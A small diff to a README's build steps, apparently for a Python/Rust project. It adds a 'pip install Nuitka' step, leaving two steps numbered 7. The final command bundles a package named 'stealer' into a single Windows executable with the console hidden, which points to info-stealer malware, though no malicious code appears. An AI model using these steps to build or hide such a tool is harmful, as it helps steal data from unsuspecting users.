@@ -5,6 +5,7 @@
 4. ``.env/bin/activate``
 5. ``maturin build``
 6. ``pip install target\wheels\file``
+7. ``pip install Nuitka``
 7. ``maturin develop``
 8. ``cd myPy``
 9. ``nuitka --onefile --include-package=stealer --windows-disable-console main.py``
